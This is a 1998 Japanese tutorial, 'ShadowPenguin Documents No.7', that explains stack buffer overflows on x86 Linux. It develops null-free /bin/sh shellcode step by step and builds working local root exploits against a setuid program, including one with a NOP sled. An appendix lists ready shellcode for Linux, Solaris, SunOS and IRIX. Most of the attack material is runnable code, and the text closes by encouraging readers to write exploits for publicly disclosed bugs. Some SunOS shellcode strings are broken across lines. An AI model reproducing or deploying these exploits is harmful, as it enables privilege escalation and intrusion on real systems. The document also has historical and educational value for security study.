@@ -1,0 +1,762 @@
+                      ====================================
+                        The ShadowPenguin Documents No.7
+
+                       - スタックオーバーフローの危険性 -
+                               Written by うにゅん
+                                  Oct.29, 1998
+                      ====================================
+
+1. はじめに
+
+UNIX上でバッファオーバーフローと言われるプログラムのバグを利用してrootを取ること
+ができることはよく知られており、それらを利用した攻撃プログラムのインターネット上
+で簡単に手に入ります。本テキストではスタックの動き、および攻撃プログラムの作り方
+を紹介しています。
+
+なおこのテキストでは、みなさんも馴染み深いx86 を中心に解説します。実験はTurbo-Li
+nux2.0J で行いました。
+
+2. バグが引き起こすセキュリティ上の問題
+
+プログラムにはバグが付き物です。そして時に致命的なのがスタックに関するバグでしょ
+う。アセンブリ言語なんかはで、落ちたらまずスタックを疑うっていうくらいですから。
+でも、UNIXなんかはC で書かれていますが、C の場合はスタックが原因でハングしたり落
+ちたりすることも少ないです。でも、その分プログラマが安心して、時に致命的なバグを
+引き起こします。それが利用されてrootになれたりするわけです。アセンブリ言語で書い
+てる場合は、落ちることはあっても、そういう危険性は少なくなるでしょうが、しんどい
+のでやっぱりC を使いますね。
+
+3.  C言語でのスタックを利用した制御
+
+では、なぜC 言語で書かれたプログラムには、セキュリティ上問題となるようなバグが発
+生してしまうのか、また、なぜ他の言語だとあまり問題ないのでしょう。何の言語でも、
+最終的にはコンパイラ（およびアセンブラ）により、機械語に変換されないと実行できな
+いわけですが、この変換の課程が各言語で大きく異なります。もちろん、ソースも異なっ
+てますが、この変換課程にC 言語は問題を抱えているわけです。この問題とUNIXの性質を
+利用することにより、rootを盗られる可能性があります。アセンブリ言語だと見たまま変
+換されるのでいいですけど、C 言語を含むコンパイラだと、いったいどういう風に変換さ
+れるのか、ディスアセンブルしないとわかりませんね。一般的なコンパイラではローカル
+変数の確保領域をスタックにとっています。たとえば、
+
+/* test1.c */
+void test(s0,s1,s2,s3)
+int s0,s1,s2,s3;
+{
+    int  s4[400];   
+    ※１
+}
+void main()
+{
+    test(0,1,2,3);
+    ※２
+}
+
+このようなプログラムだと、mainでのtest関数の呼び出し前に引数0,1,2,3 をそれぞれス
+タックにPUSH後、CALLでtest関数の先頭にIP（InstructionPointer）が設定されます。そ
+の際、CALL後に戻ってこなければならないアドレス（ret アドレス）もCALL命令によりス
+タックにPUSHされます。test関数に処理が移行した後、SP（StackPointer）を400byte 減
+算してs4ローカルバッファをスタック上に確保します。
+
+このように、static以外のローカル変数は全てスタックに確保している訳ですが、いった
+いどのくらいSPを減算したのか分からなくなると、スタックに確保されたret アドレスを
+正常に読みとれず、RET 命令が正常に動作しない（どっか、へんなとこに飛んでいく。こ
+れがアセンブリ言語だと一番泣かされる）ので、ローカルバッファを確保する前の状態に
+スタックを戻さなければいけません。
+
+80386 系のOSだと、EBP レジスタにSPのコピーを取っておくことが多いです。もちろん、
+多重関数呼び出しがあるのでEBP 自体もスタックに保存しておかないといけません。
+
+test関数内の※１では、スタックはこんな感じです（ちなみに、アドレスは適当なトコか
+ら始めました）
+
+アドレス    内用
+15496545  : 00000003
+15496541  : 00000002
+15496537  : 00000001
+15496534  : 00000000
+15496530  : 15102314 ※２のアドレス (RETアドレス)
+15496526  : EBPレジスタ
+15496522  : s4バッファ終了アドレス
+15496123  : s4バッファ開始アドレス       
+
+そして、関数testから復帰直前にローカル変数確保のために減算されてしまったSPをEBP 
+の内容をコピーすることにより戻し、CALL命令によりスタックにPUSHされたRET アドレス
+を拾ってこれるようにします。RET 命令によりmainに戻ったあとは、ローカル変数をPUSH
+した分だけスタックを調整し、実行を継続します。それでは、test関数で以下のようなこ
+とをやったらどうなるでしょう。
+
+/* test2.c */
+void test(s0,s1,s2,s3)
+int s0,s1,s2,s3;
+{
+    int  s4[400];   
+    s4[401]=12345678;
+}
+
+これ、もちろんコンパイルは通ります。ここがC 言語の問題点ですね。他の高級言語では
+こういうのはエラーが出てできないヤツが多いです。じゃなぜC 言語は通るかというと、
+単に実行速度を重視しているからです。だから正確な意味で”問題点”じゃないですね。
+
+こんなバウンドチェックなんてやってると、やっぱり実行効率は落ちますから。C 言語で
+プログラム書いてて、「時々」訳の分からない動作をする場合は、やはりこういうのを疑
+ってデバッグします。さて、上のようなことをやると、s4用に確保されたバッファの外を
+書き換えてしまいますから、動作がおかしくなる可能性大です。s4配列は0 ～399 までし
+か値を書けないですから。s4[401] はもちろんスタック領域ですが、アドレスをよくみる
+とココはRET アドレスが書かれてるトコですね。
+
+               400byte      4byte        4byte     4byte     4byte     4byte
+[----- s4バッファ-----][---EBP---][retアドレス][---s0---][---s1---][---s2---]
+s4[0]           s4[399]    s4[400]      s4[401]   s4[402]   s4[403]   s4[404]
+
+ということは、s4[401]=12345678; なんてすると、test関数からreturnする時に、mainの
+しかるべきアドレスに帰らず12345678番地に飛んでいきます。もちろん、正常動作しませ
+んね。
+
+4. スタックの意図的な書き換え
+
+RET アドレスが書き換えられるってことは、関数から復帰するときに好きなアドレスにジ
+ャンプさせることができますね。これを使うとちょっと変わったことができます。
+
+/* test3.c */
+void test(s0,s1,s2,s3)
+int s0,s1,s2,s3;
+{
+    int  s4[400];   
+    s4[401]+=16;
+}
+void main()
+{
+    test(0,1,2,3);
+    exit(1);
+    printf("hoge/n");
+}
+
+これを実行すると、"hoge"が画面に表示されます。testを呼んだあと、exit(1);してるの
+にprintfが実行されていますね。これは、s4[401]+=16 でRET 番地を書き換えて、exitを
+callした後のアドレスにreturnしてくるようにしてるからです。16ってのは、exit(1);命
+令が費やすバイト数で、デバッガで簡単に確認できます。デバッガはフリーのgdb を使用
+しました。gdb のディスアセンブラを使って、test3 の実行プログラムを覗いて見ましょ
+う。
+
+%cc test3.c
+%gdb a.out
+GDB is free software and you are welcome to distribute copies of it
+ under certain conditions; type "show copying" to see the conditions.
+There is absolutely no warranty for GDB; type "show warranty" for details.
+GDB 4.16 (i586-unknown-linux), Copyright 1996 Free Software Foundation, 
+Inc...
+(no debugging symbols found)...
+(gdb) disassemble main
+Dump of assembler code for function main:
+0x80484b0 <main>:       pushl  %ebp
+0x80484b1 <main+1>:     movl   %esp,%ebp
+0x80484b3 <main+3>:     pushl  $0x3
+0x80484b5 <main+5>:     pushl  $0x2
+0x80484b7 <main+7>:     pushl  $0x1
+0x80484b9 <main+9>:     pushl  $0x0
+0x80484bb <main+11>:    call   0x8048490 <test>
+0x80484c0 <main+16>:    addl   $0x10,%esp
+0x80484c3 <main+19>:    pushl  $0x1
+0x80484c5 <main+21>:    call   0x80483a8 <exit>
+0x80484ca <main+26>:    addl   $0x4,%esp
+0x80484cd <main+29>:    leal   0x0(%esi),%esi
+0x80484d0 <main+32>:    pushl  $0x8048538
+0x80484d5 <main+37>:    call   0x8048378 <printf>
+0x80484da <main+42>:    addl   $0x4,%esp
+0x80484dd <main+45>:    movl   %ebp,%esp
+0x80484df <main+47>:    popl   %ebp
+0x80484e0 <main+48>:    ret    
+
+main+11 にtest関数の呼び出しがありますね。本来ならその次の行main+16 に帰ってくる
+ところです。main+16 では、test関数を呼び出す際に、引数として0,1,2,3 をPUSHしたス
+タックのSPをもとに戻しています。main+19 からmain+29 でexit(1);関数の呼び出しと後
+処理が行われています。で、main+32 からprintfの処理があるわけですが、ココに飛ぶよ
+うにしました。つまり、32-16 で16byteという訳です。
+
+5. retアドレスを書き換えてshを動かす
+
+ret アドレスが自由に書き換えられるってことは、ret アドレスを機械語コードが書かれ
+ているバッファにすることも可能ですね。ということは、機械語コードで/bin/sh を呼ぶ
+ようなプログラムを配列内に書いておけば、関数からRET した時点でプロンプトが現れま
+す。/bin/sh を呼ぶアセンブラコードは次のような感じです。
+
+# test4.asm
+        jmp    0x2a           1
+        popl   %esi           2
+        movl   %esi,0x8(%esi) 3
+        movb   $0x0,0x7(%esi) 4 
+        movl   $0x0,0xc(%esi) 5
+        movl   $0xb,%eax      6
+        movl   %esi,%ebx      7
+        leal   0x8(%esi),%ecx 8
+        leal   0xc(%esi),%edx 9
+        int    $0x80          10
+        movl   $0x1, %eax     11
+        movl   $0x0, %ebx     12
+        int    $0x80          13
+        call   -0x2f          14
+        .string \"/bin/sh\"   15
+
+このプログラムにIPが移った時、いきなり1のjmpで0x2aバイト先(14)にジャンプします。
+14はさらに-0x2fバイト前(2)にretアドレスを保存してジャンプします。2ではesi レジス
+タにさっきのret アドレスを格納します。このret アドレスが"/bin/sh" 文字列が格納さ
+れているアドレスになります。
+
+なんで、わざわざjmp してcallしたのかというと文字列格納バッファの絶対アドレスを知
+るためですね。あとは/bin/sh を呼んで終了すプログラムが続きます。子プロセスの呼び
+出しはC 言語でいえばexecve命令、終了はexit命令みたいなシステムコールを使用します
+。書式はそれぞれ次のようになっています。
+
+子プロセスの実行
+al  : 0x0b子プロセス実行命令用インデクス
+ebx : Nullで終わる実行コマンドが格納されている文字列アドレス
+ecx : コマンドラインが格納されているバッファアドレス
+edx : 環境変数格納バッファのアドレス
+
+プロセスの終了
+al  : 0x01プロセス終了命令用インデクス
+bx  : 終了コード
+
+まず、子プロセス実行のための各バッファエリアを容易しなければなりません。 まずecx
+用のコマンドラインバッファを15の"/bin/sh" 文字列の次ぎのアドレスから用意します。
+コマンドラインバッファはC 言語のexecve命令同様次ぎのような形式で用意しなければな
+りません。
+
+commandline[0]="プロセス名"
+commandline[1]="引数1"
+commandline[2]="引数2"
+：
+：
+
+で、3 でcommandline[0]を作製します。プロセス名が保存されているポインタはesi でい
+いので、esi より8byte 加算したところ("/bin/sh"が7 文字なので) にesi の値を代入し
+ます。
+
+次ぎに、4 でesi+8 のアドレスに0 を入れます。これは、ebx にはnullで終わる実行コマ
+ンドが格納されている文字列アドレスを代入しなければならないためです。じゃ、最初か
+ら0 を入れとけばいいのでは？と思うかもしれませんが、その理由は後で説明します。/b
+in/sh の呼び出しには引数は指定しないので5 でcommandline[1]にNULLを入れます。0x0c
+は、"/bin/sh" の7byte+NULLの1byte+commandline[0]ポインタの4byte で計12byteという
+意味です。
+
+さて、これでバッファができました。6,7,8 でそれぞれのレジスタに値を入れ10でシステ
+ムコールを実行します。なお、環境変数は使用しないので、edx はcommandline[1]用のNU
+LL格納バッファを利用しています。
+
+以上で/bin/sh を呼び出せます。呼び出した後は、11でeax に1 を代入し、12で終了コー
+ド0(べつに何の値でもいい) をebx に代入した後、13でシステムコールを呼び出せば終了
+します。
+
+さて、このアセンブラコードを実行してみましょう。簡単にアセンブル＆実行できるコー
+ドを書いてみました。
+
+/* test5.c */
+#include <stdio.h>
+#include <string.h>
+char            *asp;
+static char     buf[2000];
+int             i,j,flag;
+void test()
+{
+__asm__("
+        jmp    0x2a
+        popl   %esi
+        movl   %esi,0x8(%esi)
+        movb   $0x0,0x7(%esi)
+        movl   $0x0,0xc(%esi)
+        movl   $0xb,%eax
+        movl   %esi,%ebx
+        leal   0x8(%esi),%ecx
+        leal   0xc(%esi),%edx
+        int    $0x80
+        movl   $0x1, %eax
+        movl   $0x0, %ebx
+        int    $0x80
+        call   -0x2f 
+        .string \"/bin/sh\" 
+
+        .string \"END\"  #EndMark (Do not remove)
+");
+}
+void run()
+{
+        int *ret;
+
+        ret=(int *)&ret+2;
+        (*ret)=(int)buf;
+}
+main(argc,argv)
+int argc;
+char *argv[];
+{
+        asp=(void *)test+3;
+        for (i=0;;i++){
+                if (strncmp(asp+i,"END",3)==0) break;
+                buf[i]=asp[i];
+        }
+        flag=0;
+        for (i=0;;i+=16){
+                if (i%8==0 && argc!=2)
+                        printf("\n%-4x : ",i);
+                else{
+                        if (i==0) printf("\"");
+                        else printf("\"\n\"");
+                }
+                for (j=0;j<16;j++){
+                        if (strncmp(asp+i+j,"END",3)==0){
+                                if (argc==2) printf("\"");
+                                printf("\n");
+                                flag=1; break;
+                        }
+                        if (argc==2){
+                                printf("\\x");
+                                if ((unsigned int)asp[i+j]<16) printf("0");
+                                printf("%x",asp[i+j]&0xff);
+                        }else{
+                                if ((unsigned int)asp[i+j]<16) printf("0");
+                                printf("%x ",asp[i+j]&0xff);
+                        }
+                }
+                if (flag==1) break;
+        }
+        printf("\nRun? (y/n)");
+        if (getchar()=='y') run();
+}
+
+実行すると、アセンブル結果が画面に表示され、実行するかどうか聞いてきます。実行す
+る場合はy をタイプしてください。実行してみると、shが起動します。このプログラムで
+は、voidrun() 関数のret アドレスを書き換えて、char型バッファであるbufferに処理を
+移行させています。
+
+5. exploit用にShell呼び出しコードを書き換える
+
+さて、以上のshell 呼び出しコードには問題があります。バイナリは次のようになってま
+すね。
+
+0    : eb 2a 5e 89 76 08 c6 46 07 00 c7 46 0c 00 00 00 
+10   : 00 b8 0b 00 00 00 89 f3 8d 4e 08 8d 56 0c cd 80 
+20   : b8 01 00 00 00 bb 00 00 00 00 cd 80 e8 d1 ff ff 
+30   : ff 2f 62 69 6e 2f 73 68 00
+
+なにが問題かというと、exploit.c は主にchar型バッファの文字列操作（strcpyなど）に
+よるバグを利用するため、0 が入っているとそこが文字列の終わりになり、そこから先が
+転送できないためです。
+
+/* test6.c */
+main()
+{
+  char buf0[100],buf1[100];
+  memset(buf1,'A',99);
+  buf1[99]='\0';
+  strcpy(buf0,buf1);
+}
+
+このプログラムはA を100 個出しますが、buf1[2]='\0'; とすると２個しか出ませんね。
+それと同じ理由です。それでは何とかして0 のない機械語コードを作らないといけません
+。0 を生成してる問題のコードは、
+
+(1)
+movb   $0x0,0x7(%esi)      c6 46 07 00
+movl   $0x0,0xc(%esi)      c7 46 0c 00 00 00 00
+(2)
+movl   $0xb,%eax           b8 0b 00 00 00
+(3)
+movl   $0x1, %eax          68 01 00 00 00
+movl   $0x0, %ebx          bb 00 00 00 00
+
+です。
+(1) は、0x0 をモロ使ってるので、やめましょう。xor を使えば0 を代入するテクがある
+のでこれを使います。まぁ、普通は0 を代入するときはこっちの方が高速なのでこっちを
+つかいますけど...
+
+xorl   %eax,%eax
+movb   %eax,0x7(%esi)
+movl   %eax,0xc(%esi)
+
+これでOK。
+
+次ぎに(2) ですが、movlなんか使ってるので、0xb が0x0000000bとなってしまいます。シ
+ステムコールには、alに0x0bが代入されていればいいので、
+
+movb   $0xb,%al
+
+に変更します。
+
+(3)では、movl $0x1, %eaxが、やはり(2)と同様の理由で0を生成しますので、まずebx に
+xor で0 を代入したあと、eax にebx の内用をコピー。その後eax をインクリメントすれ
+ばOKです。
+
+xorl   %ebx,%ebx
+movl   %ebx,%eax
+inc    %eax
+
+さて、これで機械語コードを見てみましょう。
+
+0    : eb 1f 5e 89 76 08 31 c0 88 46 07 89 46 0c b0 0b 
+10   : 89 f3 8d 4e 08 8d 56 0c cd 80 31 db 89 d8 40 cd 
+20   : 80 e8 dc ff ff ff 2f 62 69 6e 2f 73 68 00
+
+最後に"/bin/sh" 後のNULLがありますが、どのみち内部プログラムで0 を書くので消して
+しまってかまいません。これで、完璧なshell 呼び出しコードができました。test5.c で
+確認しましょう。なにか引数を付けてtest5.c を実行すると、charバッファに代入できる
+ような形式で表示されますので、コピーペーストしときましょう。
+
+char sh[]=
+   "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+   "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+   "\x80\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";
+
+6. バッファオーバーフローとshell呼びだしコードの実行
+
+ret=(int*)&ret+2;(*ret)=(int)buf; ではなく、strcpyでバッファをオーバーフローさせ
+てshell 呼びだしコードを実行させてみましょう。
+
+/* test7.c */
+char sh[]=
+   "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+   "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+   "\x80\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";
+
+char buffer_L[8000];
+
+void main() {
+  char buffer_S[7950];
+  int  i,*ret;
+
+  ret=(int *)buffer_L;
+  for (i = 0; i < 2000; i++)
+    *(ret + i) = (int)buffer_S;
+
+  memcpy(buffer_L,sh,45);
+  strcpy(buffer_S,buffer_L);
+}
+
+7990byteしかないbuffer_Sに8000byteあるbuffer_Lをstrcpyでコピーしてますが、もちろ
+ん落ちずにShell が呼ばれます。まず、buffer_Lの全部をbuffer_Sの存在するポインタで
+埋めてしまいます。
+
+次ぎに45byteのshell コードshをbuffer_Lにコピーします。これで、先頭45byteはshell 
+コードで残りはそのshell コードが書かれているアドレスになりますね（ただし、shell 
+コードの終わりの46,47byte 目は無意味な数値ですが... ）これをbuffer_Sにstrcpyでコ
+ピーすると、本当のret アドレスを含めてスタックが50byteほどshell コードのアドレス
+の値で上書きされます。その破壊された所はどこかに関数からのret アドレスがあります
+ので、strcpyが終わったあと、スタック内（buffer_S）のshell コード開始アドレスにジ
+ャンプする訳です。
+
+7. スタックオーバーフローでrootになる
+
+スタックオーバーフローでshell が呼び出せることが分かったとろで、外部プログラムで
+試してみましょう。インターネット上でダウンロードできるoverflow-exploit.cは、何ら
+かのプログラムに渡す引数や環境変数でのバウンドチェック忘れのバグを利したものが多
+いです。スタックオーバーフローバグを引数で引き起こす簡単なプログラムを以下に示し
+ます。
+
+/* test8.c */
+void main(int argc,char *argv[]) {
+  char buffer_S[7950];
+  strcpy(buffer_S,argv[1]);
+}
+
+これのプログラム、第１引数に1 万個の文字列を入れたりするとオーバーフローを起こし
+ますね。この引数文字列にshell コードとret アドレスを書いたものを入れておけば、ma
+in関数からの復帰時にshell コードが実行できます。それでは、これを/home/hogeでコン
+パイルしておきましょう。
+
+$pwd
+/home/hoge
+$cc test8.c ?o tgprog
+
+ここでもし
+
+su
+Password:Rootパスワード入力
+#chmod 4755 tgprog
+#chown root tgprog
+
+としておけば、shell コード実行でrootプロンプトが現われます。これがoverflow-explo
+it.cの基本原理です。tgprogに引数を渡してrootプロンプトを出してみましょう。
+
+/* test9.c */
+#include <stdlib.h>
+
+#define OFFSET                  15964
+#define BUFFER_SIZE             8000
+
+char shellcode[] =
+  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+  "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+unsigned long get_sp(void) {
+   __asm__("movl %esp,%eax");
+} 
+
+int    sp,i;
+char   *buff;
+int    *ibuff, ret;
+int    i;
+
+void main(int argc, char *argv[]) {
+
+  if (!(buff = malloc(BUFFER_SIZE))) { ※1
+    printf("malloc() error.\n");
+    exit(0);
+  }
+  sp=get_sp(); ※2
+  ret = sp - OFFSET; ※3
+
+  ibuff = (int *)buff;
+  for (i = 0; i < BUFFER_SIZE; i+=4) ※4
+    *(ibuff++) = ret;
+
+  for (i = 0; i < strlen(shellcode); i++) ※5
+    buff[i] = shellcode[i];
+  buff[BUFFER_SIZE - 1] = '\0';
+  
+  execl("/home/hoge/exp/tgprog","tgprog",buff,NULL); ※6
+}
+
+このプログラムは、tgprogにcharバッファbuffの引数を渡しています。buffにはshell 呼
+び出しコードとret アドレスが格納されています。順を追って解説します。
+
+※1引数バッファ確保
+※2現在のスタックポインタを求める
+
+unsigned long get_sp(void) {
+   __asm__("movl %esp,%eax");
+}
+
+を呼んでいますね。eax にスタックポインタesp を代入しています。Ｃ言語の場合、関数
+からのreturn値はeax になりますので、この関数でスタックポインタが求まります。厳密
+にはスタックポインタ-8byte（ebp+ret 番地）の値になりますが。
+
+※3ret番地を求める
+
+他のプログラムでも使用するスタックは同じアドレスから開始されますので、とりあえず
+このプログラムでのローカル変数が何もない状態でのスタックアドレスを求めます。
+
+ターゲットプログラムのバッファサイズに応じて求めたOFFSETを引きます。Root-exploit
+.cを作る上で、このOFFSETを求めることが重要になってきます。
+
+ターゲットを実行する際には、execl 命令をつかってますので、スタックには送り込む引
+数文字列が入ります。そのため、引数文字列長8000byte必要です。そして、ターゲットプ
+ログラムのバッファが7952byte(4byteきざみで確保されるため7950byte確保しても7952by
+teになる) 、tgprogの初期使用スタックなどで12byteの合計15964byte となります。この
+ret アドレスは、ターゲットプログラムのソースコードがないと割り出しが面倒ですが、
+その方法については後述します。
+
+※4retアドレスで引数バッファを埋める
+※5shellコードを書く
+※6ターゲットを呼び出す
+
+8. 実用的なoverflow-exploit.cの作り方
+
+以上の方法では、ret アドレスを探す手間が結構かかり大変です。そこでNOP を使って、
+「だいたいのアドレス」でもshell コードが動くように変更できれば、ret アドレスを探
+す効率も上がります。NOP 命令とは、「なにもしない」という命令で、ただ単にメモリを
+1byte 消費する命令です。細かいディレイ制御なんかに使われてます。NOP 命令は0x90で
+表されます。引数バッファを書く際に以下のようにします。
+
+[--------retアドレス--------][---shell code---][-------------NOP-------------]
+buff+7999                                                               buff+0
+
+これで、ret アドレスはNOP のどの部分を指定しても、いつかはshellcode が実行されま
+す。
+
+/* test10.c */
+include <stdlib.h>
+
+#define OFFSET         15000
+#define BUFFER_SIZE    8000
+#define RANGE          3000
+#define NOP            0x90
+
+char shellcode[] =
+  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+  "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+unsigned long get_sp(void) {
+   __asm__("movl %esp,%eax");
+}
+
+int   sp,i;
+char  *buff;
+int   *ibuff,ret;
+int   i;
+
+void main(int argc, char *argv[]) {
+
+  if (!(buff = malloc(BUFFER_SIZE))) {
+    printf("malloc() error.\n");
+    exit(0);
+  }
+  sp=get_sp();
+  ret = sp - OFFSET;
+
+  ibuff = (int *) buff;
+  for (i = 0; i < BUFFER_SIZE; i+=4)
+    *(ibuff++) = ret;
+
+  for (i = 0; i < RANGE; i++)
+    buff[i]=NOP;
+
+  for (i = 0; i < strlen(shellcode); i++)
+    buff[i+RANGE] = shellcode[i];
+
+  buff[BUFFER_SIZE - 1] = '\0';
+  
+  execl("/home/hoge/exp/tgprog","tgprog",buff,NULL);
+
+}
+
+このプログラムではRANGE でNOP のバイト数を指定できます。3000byteに指定されていま
+すが、これによりOFFSETで3000byteまでの誤差ならshell 呼び出しができます。
+
+9. 最後に
+
+スタックオーバーフローによる攻撃の原理について書きました。応用すればbugtraq 等で
+公表されているバグを利用して、overflow-exploit.cを作成することもできます。では。
+
+
+―　参考文献 ―
+
+[1] "Smashing The Stack For Fun And Profit", Aleph One, Phrack 49. Vol.7. File 
+    14 of 16
+[2] "Stack Smashing Vulnerabilities in the UNIX Operating System", Nathan P. 
+    Smith, Computer Science Department,1997
+[3] "An Introduction to executing arbituary code via stack overflows"
+
+
+― 参考資料 ―
+
+各OSのShellコードおよびスタックポインタの取得方法
+
+(1) i386/Linux
+/*
+        jmp    0x1f
+        popl   %esi
+        movl   %esi,0x8(%esi)
+        xorl   %eax,%eax
+        movb   %eax,0x7(%esi)
+        movl   %eax,0xc(%esi)
+        movb   $0xb,%al
+        movl   %esi,%ebx
+        leal   0x8(%esi),%ecx
+        leal   0xc(%esi),%edx
+        int    $0x80
+        xorl   %ebx,%ebx
+        movl   %ebx,%eax
+        inc    %eax
+        int    $0x80
+        call   -0x24
+        .string \"/bin/sh\"
+*/
+char shellcode[] =
+  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+  "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+#define NOP_SIZE  1
+char nop[] = "\x90";
+
+unsigned long get_sp(void) {
+   __asm__("movl %esp,%eax");
+}
+
+(2) SPARC/Solaris
+/*
+        sethi   0xbd89a, %l6
+        or      %l6, 0x16e, %l6
+        sethi   0xbdcda, %l7
+        and     %sp, %sp, %o0
+        add     %sp, 8, %o1
+        xor     %o2, %o2, %o2
+        add     %sp, 16, %sp
+        std     %l6, [%sp - 16]
+        st      %sp, [%sp - 8]
+        st      %g0, [%sp - 4]
+        mov     0x3b, %g1
+        ta      8
+        xor     %o7, %o7, %o0
+        mov     1, %g1
+        ta      8
+*/
+char shellcode[] =
+  "\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e\x2f\x0b\xdc\xda\x90\x0b\x80\x0e"
+  "\x92\x03\xa0\x08\x94\x1a\x80\x0a\x9c\x03\xa0\x10\xec\x3b\xbf\xf0"
+  "\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc\x82\x10\x20\x3b\x91\xd0\x20\x08"
+  "\x90\x1b\xc0\x0f\x82\x10\x20\x01\x91\xd0\x20\x08";
+
+#define NOP_SIZE        4
+char nop[]="\xac\x15\xa1\x6e";
+
+unsigned long get_sp(void) {
+  __asm__("or %sp, %sp, %i0");
+}
+
+
+(3) SPARC/SunOS
+/*
+        sethi   0xbd89a, %l6
+        or      %l6, 0x16e, %l6
+        sethi   0xbdcda, %l7
+        and     %sp, %sp, %o0
+        add     %sp, 8, %o1
+        xor     %o2, %o2, %o2
+        add     %sp, 16, %sp
+        std     %l6, [%sp - 16]
+        st      %sp, [%sp - 8]
+        st      %g0, [%sp - 4]
+        mov     0x3b, %g1
+        mov     -0x1, %l5
+        ta      %l5 + 1
+        xor     %o7, %o7, %o0
+        mov     1, %g1
+        ta      %l5 + 1
+*/
+char shellcode[] =
+  "\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e\x2f\x0b\xdc\xda\x90\x0b\x8
+0\x0e"
+  "\x92\x03\xa0\x08\x94\x1a\x80\x0a\x9c\x03\xa0\x10\xec\x3b\x
+bf\xf0"
+  "\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc\x82\x10\x20\x3b\xaa\x10\x3f
+\xff"
+  "\x91\xd5\x60\x01\x90\x1b\xc0\x0f\x82\x10\x20\x01\x91\xd5\x
+60\x01";
+
+#define NOP_SIZE        4
+char nop[]="\xac\x15\xa1\x6e";
+
+unsigned long get_sp(void) {
+  __asm__("or %sp, %sp, %i0");
+}
+
+
+(4) MIPS/IRIX
+/*
+        li $4,0x1234
+        sub $4,0x1234
+        bgezal $4,pc-4
+        sgt $6,$sp,$sp
+        addi $4,$31,264+36
+        sb $6,-264+7($4)
+        sub $4,264
+        addi $5,$4,264+8
+        sw $4,-264($5)
+        sw $4,-260($5)
+        sub $5, 264
+        li $v0,1011
+        syscall 0xfffff
+        "/bin/sh"
+*/
+unsigned long shellcode[] = {
+   0x24041234, 0x2084edcc, 0x0491fffe, 0x03bd302a,
+   0x23e4012c, 0xa086feff, 0x2084fef8, 0x20850110,
+   0xaca4fef8, 0xaca6fefc, 0x20a5fef8, 0x240203f3,
+   0x03ffffcc, 0x2f62696e, 0x2f7368ff
+};
+unsigned long get_sp_code[] = {0x03a01025, 0x03e00008, 0x00000000 };
+unsigned long (*get_sp)(void) = (unsigned long (*)(void))get_sp_code;
+
+
